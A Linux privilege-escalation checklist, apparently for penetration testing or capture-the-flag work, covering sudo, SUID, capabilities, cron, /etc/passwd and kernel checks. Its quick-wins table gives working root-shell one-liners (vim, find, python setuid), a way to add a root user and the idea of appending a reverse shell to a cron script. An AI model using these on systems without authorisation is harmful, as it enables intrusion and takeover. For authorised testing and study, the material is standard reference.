# Linux Privilege Escalation Checklist

Work through this roughly top-to-bottom; the easy wins are near the top.

## System Info
```bash
uname -a; cat /etc/os-release
sudo -l                        # what can this user run as root, without a password?
id; groups
```

## Automated Enumeration (run these first, review manually after)
```bash
./linpeas.sh
./linux-smart-enumeration.sh
```

## Manual Checks
- [ ] `sudo -l` output — any binary listed here can often be abused via [GTFOBins](https://gtfobins.github.io)
- [ ] SUID/SGID binaries: `find / -perm -4000 -o -perm -2000 2>/dev/null`
- [ ] Writable `/etc/passwd` or `/etc/shadow`? → add a root UID-0 user directly
- [ ] Cron jobs running as root that call a world-writable script: `cat /etc/crontab; ls -la /etc/cron.*`
- [ ] Capabilities on binaries: `getcap -r / 2>/dev/null` (e.g., `cap_setuid+ep` on a binary = instant root)
- [ ] Kernel version — any known local privesc CVE for this exact version?
- [ ] Docker group membership (`docker` group = root-equivalent via container mount escape)
- [ ] NFS exports with `no_root_squash`
- [ ] World-writable files owned by root, especially scripts referenced by services/cron
- [ ] Environment variables / `PATH` hijacking opportunities in scripts run by root
- [ ] Password reuse — check config files, `.bash_history`, backup files for plaintext creds

## Quick Wins Table
| Finding | Exploit approach |
|---|---|
| `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/vim` | GTFOBins: `sudo vim -c ':!/bin/sh'` |
| SUID on `find` | `find . -exec /bin/sh -p \; -quit` |
| Writable `/etc/passwd` | `openssl passwd -1 -salt x pass` → append new root user line |
| Cron running world-writable script as root | Append reverse shell payload to the script |
| Capability `cap_setuid+ep` on python | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |

## Kernel Exploits (last resort)
Only after the above is exhausted — kernel exploits can crash the box. Check `searchsploit` and CVE databases against the exact `uname -r` output.